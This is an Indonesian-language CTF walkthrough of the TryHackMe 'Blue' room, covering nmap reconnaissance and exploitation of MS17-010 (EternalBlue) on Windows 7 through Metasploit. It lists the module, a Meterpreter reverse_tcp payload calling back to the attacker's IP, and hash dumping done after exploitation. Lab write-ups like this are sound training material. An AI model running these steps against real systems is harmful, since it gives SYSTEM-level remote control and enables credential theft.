markdown

# TryHackMe: Blue - Writeup & Walkthrough

Repo ini berisi dokumentasi langkah-langkah penyelesaian room [Blue](https://tryhackme.com) di TryHackMe. Room ini berfokus pada eksploitasi kerentanan **MS17-010 (EternalBlue)** pada mesin Windows 7.

## 1. Reconnaissance (Recon)
Langkah awal dilakukan dengan memindai target menggunakan `nmap` untuk mencari port yang terbuka dan layanan yang berjalan.

```bash
nmap -sV -vv -Pn <TARGET_IP>

Gunakan kode dengan hati-hati.
Ditemukan port 445 (SMB) terbuka. Selanjutnya, dilakukan pengecekan apakah target rentan terhadap exploit EternalBlue:
bash

nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

Gunakan kode dengan hati-hati.
Hasil: Host terkonfirmasi VULNERABLE terhadap CVE-2017-0143.
2. Gain Access (Exploitation)
Menggunakan Metasploit Framework untuk mendapatkan akses awal.

    Jalankan Metasploit: msfconsole
    Cari modul: search ms17-010
    Gunakan modul: use exploit/windows/smb/ms17_010_eternalblue
    Konfigurasi:
        set RHOSTS <TARGET_IP>
        set LHOST <YOUR_VPN_IP>
        set payload windows/x64/meterpreter/reverse_tcp
    Eksekusi: exploit

Hasil: Mendapatkan shell Meterpreter dengan hak akses NT AUTHORITY\SYSTEM.
3. Post-Exploitation & Flag Discovery
Setelah mendapatkan akses sistem, langkah selanjutnya adalah melakukan enumerasi lanjutan untuk menemukan flag yang tersembunyi sebagai bukti keberhasilan eksploitasi (Proof of Concept).
Langkah-langkah:

    Verifikasi Hak Akses: Memastikan sesi berjalan dengan privilese tinggi (SYSTEM).
    Pencarian File Flag: Mencari file teks di lokasi umum seperti direktori root, folder dokumen pengguna, dan folder konfigurasi sistem.
    Pengambilan Hash (Opsional): Dalam konteks simulasi, pengujian keamanan sering kali melibatkan pengambilan hash kata sandi untuk mendemonstrasikan kerentanan kredensial yang lemah.

Lokasi Flag yang Ditemukan:

    Flag 1: Terletak di direktori utama sistem (C:\).
    Flag 2: Ditemukan di dalam direktori konfigurasi sistem Windows.
    Flag 3: Ditemukan di dalam folder dokumen salah satu profil pengguna.

<img width="768" height="453" alt="image" src="https://github.com/user-attachments/assets/1ae1fdf2-f255-46ac-8893-4736cde1ea09" />
<img width="767" height="633" alt="image" src="https://github.com/user-attachments/assets/145e5135-0929-4b8b-ad29-a065384d3ed6" />
<img width="763" height="580" alt="image" src="https://github.com/user-attachments/assets/52091643-d71f-4822-8c36-e1ef02093a96" />
<img width="774" height="322" alt="image" src="https://github.com/user-attachments/assets/19d76903-f9ec-4ab1-8b46-0604f682c068" />
<img width="768" height="594" alt="image" src="https://github.com/user-attachments/assets/1125230f-c071-4152-9eef-23a812453370" />
